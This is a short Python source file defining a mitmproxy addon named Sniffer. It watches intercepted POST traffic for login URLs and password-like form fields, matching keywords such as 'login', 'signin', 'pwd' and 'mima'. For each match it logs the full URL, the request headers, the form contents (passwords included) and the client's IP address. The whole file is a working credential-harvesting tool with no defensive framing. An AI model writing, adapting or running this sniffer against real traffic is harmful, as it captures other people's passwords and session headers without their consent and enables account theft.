#coding:utf-8
import logging
from mitmproxy import http

password_key = ["password", "pwd", "pass", "passwd", "mm", "passport", "auth", "key", "mima"]
form_login_key = ["check", "login", "verify", "account", "logon", "signin", "denglu"]


class Sniffer:

    def request(self, flow: http.HTTPFlow):
        request = flow.request
        url = request.pretty_url
        form_url = str(request.urlencoded_form)
        if request.method == 'POST':
            if self.any_match(form_login_key, url) or self.any_match(password_key, form_url):
                self.resolve(flow)

    def any_match(self, list, str: str):
        lower_str = str.lower()
        for i in list:
            if i in lower_str:
                return True
        return False

    def resolve(self, flow: http.HTTPFlow):
        request = flow.request
        url = request.url
        _from = str(flow.client_conn.ip_address)
        url_form = str(request.urlencoded_form)
        header = str(request.headers)

        logging.info("url: %s \nheader: %s \nform: %s \nip_from: %s", url, header, url_form, _from)

